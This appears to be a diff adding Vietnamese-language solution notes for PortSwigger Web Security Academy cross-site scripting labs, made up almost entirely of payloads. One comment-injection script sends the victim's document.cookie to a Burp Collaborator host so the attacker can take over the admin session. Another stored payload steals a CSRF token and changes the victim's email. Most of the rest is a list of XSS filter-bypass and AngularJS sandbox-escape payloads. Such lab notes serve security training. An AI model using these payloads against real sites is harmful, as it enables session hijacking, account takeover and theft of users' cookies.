@@ -3,3 +3,52 @@
 2: Nhập nội dung ở câu 1 vào comment và post comment
 
 3:
+
+14: Thử và thấy có thể inject được phần comment của web, ta thêm vào nội dung comment như sau:
+</p><script>fetch('https://onfpoqbji8qlb1r6z86jwk4tkkqbe32s.oastify.com',{method:'POST',mode:'no-cors',body:document.cookie});</script>
+đoạn script này sẽ được chạy và gửi đến burpsuite collab kèm theo cookie của victim. Sau khi post comment chờ một lúc ở collab sẽ có HTTP req, lấy session cookie đó và thay vào cookie của req GET / ta sẽ chuyển sang acc admin
+
+15: XEM SOLUTION
+
+16: đưa vào nội dung phần comment
+
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('email=a@a'+'&csrf='+token)
+};
+</script>
+
+17: XEM SOLUTION
+
+18: điền vào payload của exploit sever:
+
+%3Cxss+id%3Dsolved+onfocus%3Dalert%28document.cookie%29%3E#solved';
+
+bấm store và delivery to victim
+
+19: ?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert()%3E
+
+20: ?%27accesskey=%27x%27onclick=%27alert()
+
+21: </script><script>alert()</script>
+
+22: \';alert();//
+
+23: https://0a0a0050034d3b19c0d01d2d001a0001.web-security-academy.net%26apos;-alert(document.domain)-%26apos;
+
+24: ${alert(document.domain)}
+
+25: <svg><a><animate attributeName=href values=javascript:alert() /></a>
+
+26: (XEM SOLUTION) post?postId=1&%27},x=x=>{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+
+27: /?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+
+28: 
